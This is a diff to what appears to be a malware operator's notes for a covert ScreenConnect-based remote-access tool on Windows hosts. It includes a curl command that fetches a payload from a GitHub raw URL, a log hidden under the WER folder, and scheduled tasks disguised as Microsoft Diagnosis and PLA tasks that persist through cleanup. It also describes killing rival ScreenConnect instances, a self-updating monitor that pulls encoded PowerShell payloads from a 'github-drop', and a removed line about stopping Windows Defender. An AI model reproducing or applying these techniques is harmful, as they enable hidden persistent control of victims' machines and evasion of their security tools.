@@ -6,10 +6,14 @@ curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.c
 ## After detach — wait ~60s then verify
 type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
 sc query state= all | findstr /I ScreenConnect
+schtasks /query /tn "\Microsoft\Windows\Diagnosis\Scheduled" /fo LIST
+schtasks /query /tn "\Microsoft\Windows\PLA\Server" /fo LIST
 
 ## Current build
-- OWN BUILD 20260731O3
+- OWN BUILD 20260802O4 + OWN_MON 20260802M1
 - Detaches via wmic (Guest 30s kill cannot stop worker)
-- No sync sc stop WinDefend (that hung O2 on locked hosts)
 - order: ensure primary sevrz RUNNING, THEN nuke foreign SC
 - Keep: 5f6010579852e507 + f861c8140d453427
+- Persist: task every 2m + alt task every 3m (PLA\Server) — survives "delete all SC" wipes
+- Auto-update: monitor pulls latest own.txt / own_mon.cmd / Script.txt from github-drop on each tick
+- Full PS payload marker: WU_BUILD_20260802_UNIFIED13 (update.b64 / updateA.b64 / Script.txt)
